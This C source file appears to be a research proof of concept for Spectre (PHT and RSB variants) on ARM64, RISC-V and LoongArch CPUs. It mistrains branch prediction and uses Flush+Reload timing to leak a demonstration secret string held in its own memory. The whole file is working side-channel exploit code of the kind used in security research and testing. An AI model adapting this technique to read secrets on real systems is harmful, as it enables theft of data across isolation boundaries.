#define _GNU_SOURCE

#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/time.h>

#if defined(__aarch64__)
#include "../libs/aarch64/lib_arch_sc_aarch64.h"
#elif defined(__riscv)
#include "../libs/riscv64/lib_arch_sc_riscv64.h"
#elif defined(__loongarch64)
#include "../libs/loongarch64/lib_arch_sc_loongarch64.h"
#else
#error "unsupported arch"
#endif

#define VOTE_BATCH_ROUNDS  3      // evaluate a position every N times we probed it
#define VOTE_MIN_COUNT     2     // winner must have at least this many hits
#define VOTE_MIN_GAP       1     // winner must exceed runner-up by this margin
#define IS_CANDIDATE(x) ((x) >= 'A' && (x) <= 'Z')

#define FLUSHRELOAD 1
#define ARCHSC      2

#if ATTACK == FLUSHRELOAD
#define MEASURE flush_reload
#elif ATTACK == ARCHSC
#define MEASURE measure_arch_sc
#else
#error "unsupported attack"
#endif

#define PHT   1
#define PHT_T 2
#define RSB   3

#if defined(__aarch64__)
// Oryon, A76
#define SPECTRE PHT_T
#elif defined(__riscv)
// C910
#define SPECTRE PHT
#elif defined(__loongarch64)
// Loongson
#ifdef PRIV
#define SPECTRE PHT_T
#else
#define SPECTRE RSB
#endif
#else
#error "unsupported arch"
#endif

/* #define VERBOSE */

// accessible data
#define DATA "data|"
// inaccessible secret (following accessible data)
#define SECRET "SECRET"

#if defined(__aarch64__)
#define page_size 16384
#elif defined(__riscv)
#define page_size 4096
#elif defined(__loongarch64)
#define page_size 16384
#else
#error "unsupported arch"
#endif

#define DATA_SECRET DATA SECRET

#define OFFSET 0

static uint16_t votes[sizeof(DATA_SECRET)][256];
static uint32_t attempts[sizeof(DATA_SECRET)];
static uint8_t  resolved[sizeof(DATA_SECRET)];


unsigned char data[128];
char *mem;

unsigned char throttle[8 * page_size];

static int pick_winner_with_confidence(size_t pos, char *out) {
    int best = -1, second = -1;
    int best_c = -1, second_c = -1;

    for (int c = 0; c < 256; c++) {
        if (!IS_CANDIDATE(c)) continue;
        int v = votes[pos][c];
        if (v > best_c) {
            second_c = best_c; second = best;
            best_c = v; best = c;
        } else if (v > second_c) {
            second_c = v; second = c;
        }
    }

    if (best >= 0 && best_c >= VOTE_MIN_COUNT && (best_c - (second_c < 0 ? 0 : second_c)) >= VOTE_MIN_GAP) {
        *out = (char)best;
        return 1;
    }
    return 0;
}

__attribute__((noinline, aligned(4096))) void access_array(int x) {
  // flushing the data which is used in the condition increases
  // probability of speculation
  size_t len = sizeof(DATA) - 1;
  mfence();

#if SPECTRE==PHT
  flush(&len);

  // check that only accessible part (DATA) can be accessed
  if ((float)x / (float)len < 1) {
    // countermeasure: add the fence here
    maccess(mem + data[x] * page_size + OFFSET);
  }
#elif SPECTRE==PHT_T
  flush(&x);
  for (int i = 0; i < 8; i++) {
      flush(throttle + i * page_size);
  }
  /* ensure data is flushed at this point */
  mfence();

  maccess(&data[x]);
  // Alternative: slow down even more
  if((x / throttle[0] / throttle[page_size] / throttle[2*page_size] / throttle[3 * page_size]) <
      (len / throttle[4 * page_size] / throttle[5 * page_size] / throttle[6 * page_size] / throttle[7 * page_size])) { //strlen(data) - strlen(data + sizeof(DATA))) {
      maccess(mem + data[x] * page_size + OFFSET);
  }
#elif SPECTRE==RSB
    extern void return_to2();

    void **call_a = (void **)(exec_mapping + 64*1337);
    *call_a = (void*)&return_to2;

    mfence();
    nospec();

    flush(call_a);

    mfence();
    nospec();

    asm volatile(
        ".global return_to2\n"

        "bl 1f\n"
        "ld.b $r23, %[access], 0\n"
        "1:\n"
        "ld.d $r1, %[call_a], 0\n"
        "jirl $r0,$r1,0\n"
        "return_to2:\n"
        :: [access] "r"(mem + data[x] * page_size + OFFSET), [call_a] "r"(call_a) : "r23", "r0", "r1");
#else
    #error "Unsupported Spectre variant"
#endif
}

int main(int argc, const char **argv) {
  int cpu = -1;
  if (argc > 1) {
      cpu = atoi(argv[1]);
  }
  init_arch_sc(&cpu);

#if ATTACK != ARCHSC
  CACHE_MISS = detect_flush_reload_threshold();
  printf("Cache miss: %zd\n", CACHE_MISS);
#endif

  // page aligned
  char* _mem = (char*)mmap(0, page_size*(256+4), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);
  mem = (char *)(((size_t)_mem & ~(page_size-1)) + page_size * 2);
  // initialize memory
  memset(mem, 0x42, page_size * 256);

  // store secret
  memset(data, ' ', sizeof(data));
  memcpy(data, DATA_SECRET, sizeof(DATA_SECRET));
  // ensure data terminates
  data[sizeof(data) / sizeof(data[0]) - 1] = '0';

  memset(votes,    0, sizeof(votes));
  memset(attempts, 0, sizeof(attempts));
  memset(resolved, 0, sizeof(resolved));

#if ATTACK == ARCHSC
  void* victim = mem + OFFSET;
  int a = 0;
  int b = 0;
  for (int i=0; i<2*n; i++) {
    int choice = random() % 2;
    flush(victim);
    mfence();
    nospec();
    if (!choice) {
      mfence();
      nospec();
      maccess(victim);
    }
    if (choice) {
      mfence();
      nospec();
      a += measure_arch_sc(victim);
    } else {
      mfence();
      nospec();
      b += measure_arch_sc(victim);
    }
  }
  printf("should be low:  %6.2f\n", (float)a * 100 / n);
  if ((float)a * 100 / n > 5) {
      exit(42);
  }
  printf("should be high: %6.2f\n", (float)b * 100 / n);
  if ((float)b * 100 / n < 95) {
      exit(42);
  }
    printf("---------------\n");
#endif

  // flush everything
  int i, j = 0, k;
  for (j = 0; j < 256; j++) {
    flush(mem + j * page_size + OFFSET);
  }
  for (j = 0; j < 8; j++) {
    throttle[j * page_size] = 1;
  }

  // nothing leaked so far
  char leaked[sizeof(DATA_SECRET) + 1];
  memset(leaked, ' ', sizeof(leaked));
  leaked[sizeof(DATA_SECRET)] = 0;

  j = 0;

  sched_yield();

  struct timeval start_time, end_time;
  gettimeofday(&start_time, NULL);

  int n_leaked = 0;
  for (int zz = 0; zz < 100000*(sizeof(DATA_SECRET)-1); zz++) {
    // for every byte in the string
    j = (j + 1) % (sizeof(DATA_SECRET)-1);

    // Mistrain with valid index.
#if SPECTRE==PHT || SPECTRE==PHT_T
    for (int y = 0; y < 20; y++) {
      access_array(0);
    }
    access_array(j);
#endif

    // only show inaccessible values (SECRET)
    if (j >= sizeof(DATA) - 1) {
      mfence(); // avoid speculation
      for (i = 0; i < 256; i++) {

#if SPECTRE==RSB
        access_array(j);
#endif
        // potential out-of-bounds access
        int mix_i = ((i * 167) + 13) & 255; // avoid prefetcher
        if (MEASURE(mem + mix_i * page_size + OFFSET)) {
/*
          if ((mix_i >= 'A' && mix_i <= 'Z') && leaked[j] == ' ') {
            leaked[j] = mix_i;
            n_leaked++;
        #ifdef VERBOSE
            printf("\x1b[33m%s\x1b[0m\r", leaked);
            fflush(stdout);
            // sched_yield();
        #endif
            // sched_yield();
          }
*/
          if (IS_CANDIDATE(mix_i) && !resolved[j]) {
            if (votes[j][mix_i] < UINT16_MAX) {
              votes[j][mix_i]++;    // tally the hit
            }
          }
        }
        // mfence();
        flush(mem + mix_i * page_size + OFFSET);
        mfence();
      }

    attempts[j]++;

    if (!resolved[j] && (attempts[j] % VOTE_BATCH_ROUNDS == 0)) {
        char winner = 0;
        if (pick_winner_with_confidence(j, &winner)) {
            leaked[j]  = winner;
            resolved[j] = 1;
            n_leaked++;

    #ifdef VERBOSE
            printf("\x1b[33m%s\x1b[0m\r", leaked);
            fflush(stdout);
    #endif
        }
        }
    }

    if (n_leaked >= sizeof(SECRET)-1) {
        gettimeofday(&end_time, NULL);
        break;
    }

    #if defined(__riscv)
    sched_yield();
    #endif
  }

  printf("\x1b[33m%s\x1b[0m\r", leaked);

  if (strncmp(leaked + sizeof(DATA) - 1, SECRET, sizeof(SECRET) - 1)) {
      printf("\nIncorrect!\n");
      exit(42);
  }

  printf("\n\x1b[1A[ ]\n\n[\x1b[32m>\x1b[0m] Done\n");
  int leak_time = (end_time.tv_sec - start_time.tv_sec) * 1000000 + (end_time.tv_usec - start_time.tv_usec);
  printf("Leaked %ld bytes in %d us -> %ld bytes/s\n\n%ld\n", strlen(SECRET), leak_time, strlen(SECRET) * 1000000 / leak_time, strlen(SECRET) * 1000000 / leak_time);


  return 0;
}
